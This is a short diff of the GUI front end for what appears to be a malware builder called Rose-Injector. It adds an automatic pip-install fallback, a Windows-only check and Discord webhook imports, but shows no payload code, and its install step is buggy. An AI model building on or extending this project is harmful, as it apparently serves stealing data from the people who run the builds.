@@ -1,18 +1,28 @@
-# Main GUI for Vail (Rose) made by @suegdu
+# Main GUI for Rose-Injector made by @suegdu
 # Follow the comments on each, for guiding.
 
-
-from PyQt5 import QtCore, QtGui, QtWidgets
-from PyQt5.QtCore import QRunnable, Qt, QThreadPool
-import webbrowser
-import time
-import requests
-from bs4 import BeautifulSoup
-from pathlib import Path
-from dhooks import Webhook, Embed
 __version__ = 1.0
 __repo__ = "https://github.com/DamagingRose/Rose-Injector/"
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"
+
+try:
+    import webbrowser
+    import time
+    import requests
+    import platform
+    from bs4 import BeautifulSoup
+    from pathlib import Path
+    from dhooks import Webhook, Embed
+    from PyQt5 import QtCore, QtGui, QtWidgets
+    from PyQt5.QtCore import QRunnable, Qt, QThreadPool
+except:
+    import subprocess
+    requirements = ["requests", "beautifulsoup4", "PyQt5", "pypiwin32"]
+    subprocess.run(f"python -m pip install {requirements}")
+
+if platform.system() != "Windows":
+    quit()
+
 
 class Runnable(QRunnable):
     def __init__(self, n, webhook_url):
@@ -45,11 +55,7 @@ class Runnable_wf(QRunnable):
                f.write(str(text))
        except Exception as e:
            print(e)
-       
-       
 
-
-    
 
 class Ui_MainWindow_vailB(object):
     # This is the final shape of builder's gui and it is not linked to any functions with builder's functionality. -suegdu 3/11/2023
